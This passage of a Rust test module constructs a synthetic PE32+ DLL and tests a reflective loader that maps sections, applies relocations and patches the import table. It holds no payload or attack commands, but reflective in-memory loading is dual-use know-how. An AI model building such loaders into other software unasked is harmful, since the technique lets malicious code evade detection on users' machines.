    const FILE_ALIGNMENT: u32 = 0x1000;
    const PREFERRED_BASE: u64 = 0x180000000;

    /// Indices into the data-directory array.
    const DIR_IMPORT: usize = 1;
    const DIR_BASE_RELOC: usize = 5;

    struct SyntheticPe {
        bytes: Vec<u8>,
        /// RVA of the qword in .text that has a DIR64 reloc applied to it.
        reloc_target_rva: usize,
        /// Address the resolver must hand back for "test.dll!ExportedFn".
        expected_export_addr: u64,
    }

    /// Build a minimal PE32+ DLL with one import and one DIR64 relocation.
    fn build_synthetic_pe() -> SyntheticPe {
        // ---- 1. compute layout ----
        let section_table_off = DOS_STUB_LEN + PE_SIG.len() + COFF_HEADER_LEN + OPT_HEADER_LEN;
        let headers_size = FILE_ALIGNMENT as usize; // round headers up to a page
        assert!(
            (section_table_off + 3 * 40) <= headers_size,
            "headers must fit section table"
        );

        // Section RVAs (each page-aligned).
        let text_rva = SECTION_ALIGNMENT as usize; // 0x1000
        let rdata_rva = text_rva + SECTION_ALIGNMENT as usize; // 0x2000
        let data_rva = rdata_rva + SECTION_ALIGNMENT as usize; // 0x3000
        let size_of_image = data_rva + SECTION_ALIGNMENT as usize; // 0x4000

        let entry_rva = text_rva; // entry point at start of .text

        // .rdata contents — laid out sequentially, then padded to FILE_ALIGNMENT.
        // Order: IAT (1 entry + null), ILT (1 entry + null), hint/name struct,
        // import descriptor (20B), null descriptor (20B), dll name, reloc block.
        // Both the IAT and ILT are walked by goblin until a zero qword, so each
        // needs its own 8-byte null terminator.
        let iat_slot_rva = rdata_rva; // FirstThunk: one entry + null
        let ilt_slot_rva = rdata_rva + 0x10; // OriginalFirstThunk: one entry + null
        let hint_name_rva = rdata_rva + 0x20; // u16 hint + "ExportedFn\0"
        let sym_name = b"ExportedFn\0";
        let import_desc_rva = rdata_rva + 0x30; // 20 bytes
        let null_desc_rva = import_desc_rva + 20;
        let dll_name_rva = null_desc_rva + 20; // "test.dll\0"
        let dll_name = b"test.dll\0";
        let reloc_block_rva = dll_name_rva + dll_name.len();
        // round reloc start up to a u32 boundary for cleanliness
        let reloc_block_rva = (reloc_block_rva + 3) & !3;

        // ---- 2. build .rdata bytes (will be placed at file offset rdata_rva) ----
        let mut rdata = vec![0u8; FILE_ALIGNMENT as usize];

        // IAT (FirstThunk) at [0x00]: entry0 = hint/name RVA, [0x08] = null.
        rdata[0x00..0x08].copy_from_slice(&(hint_name_rva as u64).to_le_bytes());
        // [0x08..0x10] already zero = IAT null terminator.

        // ILT (OriginalFirstThunk) at [0x10]: mirrors IAT pre-bind, [0x18] = null.
        rdata[0x10..0x18].copy_from_slice(&(hint_name_rva as u64).to_le_bytes());
        // [0x18..0x20] already zero = ILT null terminator.

        // hint/name at [0x20]: hint=1, then the null-terminated name.
        let hn_off = hint_name_rva - rdata_rva;
        rdata[hn_off..hn_off + 2].copy_from_slice(&1u16.to_le_bytes());
        rdata[hn_off + 2..hn_off + 2 + sym_name.len()].copy_from_slice(sym_name);

        // import descriptor at [0x30]: OriginalFirstThunk=ILT, Name=dll_name,
        // FirstThunk=IAT. TimeDateStamp/ForwarderChain zero.
        let id_off = import_desc_rva - rdata_rva;
        rdata[id_off..id_off + 4].copy_from_slice(&(ilt_slot_rva as u32).to_le_bytes()); // OriginalFirstThunk
        rdata[id_off + 4..id_off + 8].copy_from_slice(&0u32.to_le_bytes()); // TimeDateStamp
        rdata[id_off + 8..id_off + 12].copy_from_slice(&0u32.to_le_bytes()); // ForwarderChain
        rdata[id_off + 12..id_off + 16].copy_from_slice(&(dll_name_rva as u32).to_le_bytes()); // Name
        rdata[id_off + 16..id_off + 20].copy_from_slice(&(iat_slot_rva as u32).to_le_bytes()); // FirstThunk
                                                                                               // null_desc_rva .. +20 already zero = null terminator descriptor.

        // dll name
        let dn_off = dll_name_rva - rdata_rva;
        rdata[dn_off..dn_off + dll_name.len()].copy_from_slice(dll_name);

        // base-relocation block: page_rva=0x1000, one DIR64 entry + one padding.
        let rb_off = reloc_block_rva - rdata_rva;
        let page_rva = text_rva as u32;
        // 1 real entry + 1 padding entry = 2 * 2 = 4 bytes, + 8 header = 12.
        let block_size: u32 = 12;
        rdata[rb_off..rb_off + 4].copy_from_slice(&page_rva.to_le_bytes());
        rdata[rb_off + 4..rb_off + 8].copy_from_slice(&block_size.to_le_bytes());
        // DIR64 entry: type=10 (0xA) << 12 | offset=0 → 0xA000
        let dir64_entry: u16 = 0xA000;
        rdata[rb_off + 8..rb_off + 10].copy_from_slice(&dir64_entry.to_le_bytes());
        // ABSOLUTE padding entry: type=0 → 0x0000 (already zero).

        // ---- 3. build .text bytes ----
        let mut text = vec![0u8; FILE_ALIGNMENT as usize];
        // qword at offset 0 of .text holds the preferred base (= an absolute
        // address the reloc must fix up by `delta`).
        text[0x00..0x08].copy_from_slice(&PREFERRED_BASE.to_le_bytes());
        // a couple of dummy code bytes so the section is non-empty.
        text[0x08] = 0xC3; // ret

        // ---- 4. build .data bytes ----
        let data = vec![0xAAu8; FILE_ALIGNMENT as usize];

        // ---- 5. assemble the on-disk image ----
        let mut bytes = vec![0u8; size_of_image];
        // DOS stub: "MZ" + fill, e_lfanew at 0x3c → 0x40.
        bytes[0] = b'M';
        bytes[1] = b'Z';
        bytes[0x3C..0x40].copy_from_slice(&(DOS_STUB_LEN as u32).to_le_bytes());

        let mut off = DOS_STUB_LEN;
        bytes[off..off + 4].copy_from_slice(PE_SIG);
        off += 4;

        // COFF header (20 bytes).
        let coff = build_coff_header();
        bytes[off..off + COFF_HEADER_LEN].copy_from_slice(&coff);
        off += COFF_HEADER_LEN;

        // Optional header (PE32+). Build data directories first.
        let mut data_dirs = [[0u8; 8]; NUM_DATA_DIRECTORIES];
        data_dirs[DIR_IMPORT] = import_desc_rva.to_le_bytes(); // size patched below
        data_dirs[DIR_BASE_RELOC] = reloc_block_rva.to_le_bytes();
        // sizes:
        data_dirs[DIR_IMPORT][4..8].copy_from_slice(&40u32.to_le_bytes()); // 2 descriptors * 20
        data_dirs[DIR_BASE_RELOC][4..8].copy_from_slice(&block_size.to_le_bytes());

        let opt = build_optional_header(
            entry_rva as u32,
            size_of_image as u32,
            headers_size as u32,
            &data_dirs,
        );
        bytes[off..off + OPT_HEADER_LEN].copy_from_slice(&opt);
        off += OPT_HEADER_LEN;

        // Section table (3 entries, 40 bytes each).
        let stext = build_section_table(b".text\0\0\0", text_rva as u32, &text);
        let srdata = build_section_table(b".rdata\0\0", rdata_rva as u32, &rdata);
        let sdata = build_section_table(b".data\0\0\0", data_rva as u32, &data);
        bytes[off..off + 40].copy_from_slice(&stext);
        bytes[off + 40..off + 80].copy_from_slice(&srdata);
        bytes[off + 80..off + 120].copy_from_slice(&sdata);

        // Place sections at their file offsets (== RVAs here).
        bytes[text_rva..text_rva + text.len()].copy_from_slice(&text);
        bytes[rdata_rva..rdata_rva + rdata.len()].copy_from_slice(&rdata);
        bytes[data_rva..data_rva + data.len()].copy_from_slice(&data);

        SyntheticPe {
            bytes,
            reloc_target_rva: text_rva, // the qword at .text+0
            expected_export_addr: 0xDEADBEEFCAFEBABE,
        }
    }

    /// COFF header for a PE32+ DLL: Machine = AMD64, 3 sections, no symbols.
    fn build_coff_header() -> [u8; COFF_HEADER_LEN] {
        let mut c = [0u8; COFF_HEADER_LEN];
        c[0..2].copy_from_slice(&0x8664u16.to_le_bytes()); // IMAGE_FILE_MACHINE_AMD64
        c[2..4].copy_from_slice(&3u16.to_le_bytes()); // NumberOfSections
                                                      // TimeDateStamp[4..8] = 0
        c[8..12].copy_from_slice(&0u32.to_le_bytes()); // PointerToSymbolTable
        c[12..16].copy_from_slice(&0u32.to_le_bytes()); // NumberOfSymbols
        c[16..18].copy_from_slice(&(OPT_HEADER_LEN as u16).to_le_bytes()); // SizeOfOptionalHeader
                                                                           // Characteristics: DLL | EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
        let chars: u16 = 0x2000 | 0x0002 | 0x0020;
        c[18..20].copy_from_slice(&chars.to_le_bytes());
        c
    }

    /// PE32+ optional header (24-byte standard fields + 88-byte windows fields
    /// + 16 data directories). All field offsets follow `IMAGE_OPTIONAL_HEADER64`.
    fn build_optional_header(
        entry: u32,
        size_of_image: u32,
        size_of_headers: u32,
        data_dirs: &[[u8; 8]; NUM_DATA_DIRECTORIES],
    ) -> [u8; OPT_HEADER_LEN] {
        let mut o = [0u8; OPT_HEADER_LEN];
        // ── Standard fields (24 bytes) ───────────────────────────────────
        // [0..2]   Magic = PE32+ (0x020B)
        o[0..2].copy_from_slice(&0x020Bu16.to_le_bytes());
        o[2] = 14; // MajorLinkerVersion
        o[3] = 0; // MinorLinkerVersion
                  // [4..8] SizeOfCode, [8..12] SizeOfInitializedData, [12..16] SizeOfUninitializedData = 0
                  // [16..20] AddressOfEntryPoint
        o[16..20].copy_from_slice(&entry.to_le_bytes());
        // [20..24] BaseOfCode
        o[20..24].copy_from_slice(&0x1000u32.to_le_bytes());

        // ── Windows fields (88 bytes), starting at STD_FIELDS_LEN (24) ────
        // goblin reads these as WindowsFields64; the byte order below mirrors
        // the struct field order exactly.
        let w = STD_FIELDS_LEN;
        // [w+0 .. w+8]   ImageBase (u64)
        o[w..w + 8].copy_from_slice(&PREFERRED_BASE.to_le_bytes());
        // [w+8 .. w+12]  SectionAlignment (u32)
        o[w + 8..w + 12].copy_from_slice(&SECTION_ALIGNMENT.to_le_bytes());
        // [w+12 .. w+16] FileAlignment (u32)
        o[w + 12..w + 16].copy_from_slice(&FILE_ALIGNMENT.to_le_bytes());
        // [w+16 .. w+28] major/minor OS/image/subsystem versions (6 * u16) = 0
        // [w+28 .. w+32] Win32VersionValue (u32) = 0
        // [w+32 .. w+36] SizeOfImage (u32)
        o[w + 32..w + 36].copy_from_slice(&size_of_image.to_le_bytes());
        // [w+36 .. w+40] SizeOfHeaders (u32)
        o[w + 36..w + 40].copy_from_slice(&size_of_headers.to_le_bytes());
        // [w+40 .. w+44] CheckSum (u32) = 0
        // [w+44 .. w+46] Subsystem (u16) = 3 (WINDOWS_CUI)
        o[w + 44..w + 46].copy_from_slice(&3u16.to_le_bytes());
        // [w+46 .. w+48] DllCharacteristics (u16) = DYNAMIC_BASE | NX_COMPAT
        o[w + 46..w + 48].copy_from_slice(&0x0040u16.to_le_bytes());
        // [w+48 .. w+80] Stack/Heap reserve/commit (4 * u64) = 0
        // [w+80 .. w+84] LoaderFlags (u32) = 0
        // [w+84 .. w+88] NumberOfRvaAndSizes (u32) = 16
        o[w + 84..w + 88].copy_from_slice(&16u32.to_le_bytes());

        // ── Data directories (16 * 8 bytes) at STD_FIELDS_LEN + WIN_FIELDS_LEN ─
        let dd_start = STD_FIELDS_LEN + WIN_FIELDS_LEN;
        for (i, dir) in data_dirs.iter().enumerate() {
            o[dd_start + i * 8..dd_start + i * 8 + 8].copy_from_slice(dir);
        }
        o
    }

    /// Build a 40-byte section table entry. Raw offset == RVA because we pad
    /// headers and each section to FILE_ALIGNMENT.
    fn build_section_table(name: &[u8; 8], rva: u32, raw: &[u8]) -> [u8; 40] {
        let mut s = [0u8; 40];
        s[0..8].copy_from_slice(name);
        s[8..12].copy_from_slice(&(raw.len() as u32).to_le_bytes()); // VirtualSize
        s[12..16].copy_from_slice(&rva.to_le_bytes()); // VirtualAddress
        s[16..20].copy_from_slice(&(raw.len() as u32).to_le_bytes()); // SizeOfRawData
        s[20..24].copy_from_slice(&rva.to_le_bytes()); // PointerToRawData
                                                       // Characteristics: CODE|EXECUTE|READ for .text; INITIALIZED_DATA|READ
                                                       // otherwise. We set a generic readable flag for all; the loader below
                                                       // doesn't act on these so a permissive value is fine for tests.
        let chars: u32 = 0x4000_0040; // IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA
        s[36..40].copy_from_slice(&chars.to_le_bytes());
        s
    }

    // ── reflective loader tests ──────────────────────────────────────────

    #[test]
    fn synthetic_pe_parses_with_goblin() {
        let pe_bytes = build_synthetic_pe().bytes;
        let pe = goblin::pe::PE::parse(&pe_bytes).expect("synthetic PE must parse");
        assert!(pe.is_64, "synthetic PE must be PE32+");
        assert!(pe.is_lib, "synthetic PE must be a DLL");
        assert_eq!(pe.image_base, PREFERRED_BASE as usize);
        assert_eq!(pe.sections.len(), 3);
        // Exactly one import: test.dll!ExportedFn.
        assert_eq!(pe.imports.len(), 1, "expected exactly one import");
        assert_eq!(pe.imports[0].dll, "test.dll");
        assert_eq!(pe.imports[0].name.as_ref(), "ExportedFn");
    }

    #[test]
    fn reflective_load_rejects_empty_input() {
        let err = reflective_load(&[], &mut |_, _| unreachable!())
            .expect_err("empty input must fail to parse");
        assert!(matches!(err, ReflectiveLoadError::Parse(_)));
    }

    #[test]
    fn reflective_load_maps_sections_and_applies_reloc() {
        let synth = build_synthetic_pe();
        let pe_bytes = &synth.bytes;
        let base: u64 = 0x7FF0_0000_0000;
        let expected_addr = synth.expected_export_addr;

        let mapped = reflective_load_at(pe_bytes, base, &mut |dll, sym| {
            assert_eq!(dll, "test.dll");
            assert_eq!(sym, "ExportedFn");
            Ok(expected_addr)
        })
        .expect("reflective load should succeed");

        // Image sized to SizeOfImage.
        assert_eq!(mapped.image.len(), 0x4000);
        assert_eq!(mapped.base, base);
        // Entry point = base + 0x1000.
        assert_eq!(mapped.entry_point, base + 0x1000);

        // The qword at .text+0 was originally PREFERRED_BASE and carried a
        // DIR64 reloc; it must now equal PREFERRED_BASE + (base - PREFERRED_BASE)
        // == base.
        let fixed = u64::from_le_bytes(
            mapped.image[synth.reloc_target_rva..synth.reloc_target_rva + 8]
                .try_into()
                .unwrap(),
        );
        assert_eq!(fixed, base, "DIR64 reloc must add delta = base - preferred");

        // .data bytes survive the copy.
        assert!(
            mapped.image[0x3000..0x4000].iter().all(|&b| b == 0xAA),
            ".data section must be copied verbatim"
        );

        // IAT slot (at iat_slot_rva = 0x2000) must hold the resolved address.
        let iat_slot_rva = 0x2000usize;
        let iat_val = u64::from_le_bytes(
            mapped.image[iat_slot_rva..iat_slot_rva + 8]
                .try_into()
                .unwrap(),
        );
        assert_eq!(iat_val, expected_addr, "IAT must be patched with export VA");
    }

    #[test]
    fn reflective_load_at_preferred_base_skips_reloc() {
        // When mapped at the preferred base, delta == 0 and the reloc target
        // must be left untouched.
        let synth = build_synthetic_pe();
        let pe_bytes = &synth.bytes;
        let mapped = reflective_load_at(pe_bytes, PREFERRED_BASE, &mut |_, _| {
            Ok(synth.expected_export_addr)
        })
        .expect("load at preferred base should succeed");

        let val = u64::from_le_bytes(
            mapped.image[synth.reloc_target_rva..synth.reloc_target_rva + 8]
                .try_into()
                .unwrap(),
        );
        assert_eq!(val, PREFERRED_BASE, "no reloc applied when delta == 0");
    }

    #[test]
    fn reflective_load_reports_unresolved_import() {
        let synth = build_synthetic_pe();
        let pe_bytes = &synth.bytes;
        let err = reflective_load_at(pe_bytes, 0x1000_0000, &mut |_, _| {
            Err(ReflectiveLoadError::UnresolvedImport {
                dll: "test.dll".into(),
                symbol: "ExportedFn".into(),
            })
        })
        .expect_err("unresolved import must propagate");
        match err {
            ReflectiveLoadError::UnresolvedImport { dll, symbol } => {
                assert_eq!(dll, "test.dll");
                assert_eq!(symbol, "ExportedFn");
            }
            other => panic!("expected UnresolvedImport, got {other:?}"),
        }
    }

    #[test]
    fn reflective_load_default_base_uses_high_address() {
        let synth = build_synthetic_pe();
        let pe_bytes = &synth.bytes;
        let mapped = reflective_load(pe_bytes, &mut |_, _| Ok(synth.expected_export_addr))
            .expect("default-base load should succeed");
        // The default base is the high-half address chosen in reflective_load;
        // since it differs from PREFERRED_BASE, the reloc must have fired.
        let val = u64::from_le_bytes(
            mapped.image[synth.reloc_target_rva..synth.reloc_target_rva + 8]
                .try_into()
                .unwrap(),
        );
        assert_eq!(val, mapped.base);
        assert_ne!(mapped.base, PREFERRED_BASE);
    }
}
